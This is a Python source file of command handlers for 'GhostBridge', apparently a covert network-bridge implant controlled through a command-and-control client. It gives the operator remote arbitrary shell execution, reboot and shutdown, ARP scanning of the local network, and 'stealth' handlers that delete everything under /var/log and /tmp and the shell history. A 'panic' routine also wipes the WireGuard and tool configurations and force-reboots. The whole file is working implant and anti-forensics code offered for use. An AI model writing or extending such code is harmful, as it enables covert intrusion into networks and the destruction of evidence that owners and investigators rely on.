"""
Command Handlers

Built-in command handlers for GhostBridge operations.
"""

from __future__ import annotations

import asyncio
import logging
import os
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional

from ghostbridge.c2.client import Command, CommandResponse

logger = logging.getLogger(__name__)


@dataclass
class CommandContext:
    """Context for command execution."""

    device_id: str
    config_dir: Path
    data_dir: Path
    bridge_manager: Optional[Any] = None
    tunnel_manager: Optional[Any] = None


class CommandExecutor:
    """
    Command executor with built-in handlers.

    Provides safe command execution with:
    - Timeout handling
    - Output capture
    - Error handling
    """

    def __init__(self, context: CommandContext):
        """
        Initialize CommandExecutor.

        Args:
            context: Execution context
        """
        self.context = context
        self._handlers: dict[str, Any] = {}
        self._register_builtin_handlers()

    def _register_builtin_handlers(self) -> None:
        """Register built-in command handlers."""

        # System commands
        self._handlers["status"] = self._handle_status
        self._handlers["ping"] = self._handle_ping
        self._handlers["reboot"] = self._handle_reboot
        self._handlers["shutdown"] = self._handle_shutdown

        # Shell commands
        self._handlers["shell"] = self._handle_shell
        self._handlers["execute"] = self._handle_shell

        # Network commands
        self._handlers["bridge.status"] = self._handle_bridge_status
        self._handlers["bridge.stats"] = self._handle_bridge_stats
        self._handlers["tunnel.reconnect"] = self._handle_tunnel_reconnect
        self._handlers["scan.arp"] = self._handle_arp_scan

        # Stealth commands
        self._handlers["stealth.wipe"] = self._handle_wipe_logs
        self._handlers["panic"] = self._handle_panic

    async def execute(self, command: Command) -> CommandResponse:
        """
        Execute a command.

        Args:
            command: Command to execute

        Returns:
            Command response
        """
        handler = self._handlers.get(command.action)

        if handler is None:
            return CommandResponse(
                command_id=command.id,
                status="error",
                result=None,
                error=f"Unknown action: {command.action}",
            )

        try:
            # Handle both sync and async handlers
            if asyncio.iscoroutinefunction(handler):
                result = await handler(command)
            else:
                result = handler(command)

            return CommandResponse(
                command_id=command.id,
                status="success",
                result=result,
            )

        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return CommandResponse(
                command_id=command.id,
                status="error",
                result=None,
                error=str(e),
            )

    # ===== System Handlers =====

    def _handle_status(self, cmd: Command) -> dict:
        """Get device status."""
        import socket
        from datetime import datetime

        uptime = 0
        try:
            with open("/proc/uptime") as f:
                uptime = float(f.read().split()[0])
        except Exception:
            pass

        return {
            "device_id": self.context.device_id,
            "hostname": socket.gethostname(),
            "uptime_seconds": uptime,
            "timestamp": datetime.now().isoformat(),
        }

    def _handle_ping(self, cmd: Command) -> str:
        """Ping response."""
        return "pong"

    def _handle_reboot(self, cmd: Command) -> str:
        """Reboot device."""
        delay = cmd.payload.get("delay", 5)

        # Schedule reboot
        subprocess.Popen(
            f"sleep {delay} && sudo reboot",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        return f"Rebooting in {delay} seconds"

    def _handle_shutdown(self, cmd: Command) -> str:
        """Shutdown device."""
        delay = cmd.payload.get("delay", 5)

        subprocess.Popen(
            f"sleep {delay} && sudo shutdown -h now",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        return f"Shutting down in {delay} seconds"

    # ===== Shell Handlers =====

    def _handle_shell(self, cmd: Command) -> dict:
        """Execute shell command."""
        command = cmd.payload.get("command", "")
        timeout = cmd.payload.get("timeout", 30)
        cwd = cmd.payload.get("cwd")

        if not command:
            raise ValueError("No command specified")

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )

        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }

    # ===== Network Handlers =====

    async def _handle_bridge_status(self, cmd: Command) -> dict:
        """Get bridge status."""
        if self.context.bridge_manager is None:
            return {"error": "Bridge manager not available"}

        status = await self.context.bridge_manager.get_status()
        return {
            "name": status.name,
            "state": status.state.value,
            "wan_link": status.wan_link,
            "lan_link": status.lan_link,
            "wan_mac": status.wan_mac,
            "lan_mac": status.lan_mac,
        }

    async def _handle_bridge_stats(self, cmd: Command) -> dict:
        """Get bridge traffic stats."""
        if self.context.bridge_manager is None:
            return {"error": "Bridge manager not available"}

        stats = await self.context.bridge_manager.get_stats()
        if stats is None:
            return {"error": "Stats not available"}

        return {
            "uptime_seconds": stats.uptime_seconds,
            "packets_bridged": stats.packets_bridged,
            "bytes_bridged": stats.bytes_bridged,
        }

    async def _handle_tunnel_reconnect(self, cmd: Command) -> str:
        """Force tunnel reconnection."""
        if self.context.tunnel_manager is None:
            return "Tunnel manager not available"

        success = await self.context.tunnel_manager.reconnect()
        return "Reconnection initiated" if success else "Reconnection failed"

    def _handle_arp_scan(self, cmd: Command) -> list:
        """Get ARP table."""
        result = subprocess.run(
            ["ip", "neigh", "show"],
            capture_output=True,
            text=True,
        )

        entries = []
        for line in result.stdout.split("\n"):
            if not line.strip():
                continue

            parts = line.split()
            if len(parts) >= 5 and "lladdr" in parts:
                entries.append({
                    "ip": parts[0],
                    "mac": parts[parts.index("lladdr") + 1],
                    "interface": parts[parts.index("dev") + 1],
                    "state": parts[-1],
                })

        return entries

    # ===== Stealth Handlers =====

    def _handle_wipe_logs(self, cmd: Command) -> str:
        """Wipe logs from system."""
        paths = [
            "/var/log",
            "/tmp",
            "/var/ghostbridge/log",
        ]

        wiped = 0
        for path in paths:
            try:
                for root, dirs, files in os.walk(path):
                    for f in files:
                        try:
                            os.remove(os.path.join(root, f))
                            wiped += 1
                        except Exception:
                            pass
            except Exception:
                pass

        # Clear command history
        try:
            history_file = os.path.expanduser("~/.bash_history")
            if os.path.exists(history_file):
                os.remove(history_file)
                wiped += 1
        except Exception:
            pass

        return f"Wiped {wiped} files"

    def _handle_panic(self, cmd: Command) -> str:
        """Emergency wipe and shutdown."""
        # This should trigger the full panic sequence
        # For now, just wipe and shutdown

        self._handle_wipe_logs(cmd)

        # Wipe config
        config_paths = [
            "/etc/ghostbridge",
            "/etc/wireguard",
        ]

        for path in config_paths:
            try:
                import shutil
                shutil.rmtree(path, ignore_errors=True)
            except Exception:
                pass

        # Schedule reboot
        subprocess.Popen(
            "sync && sleep 2 && sudo reboot -f",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        return "Panic sequence initiated"

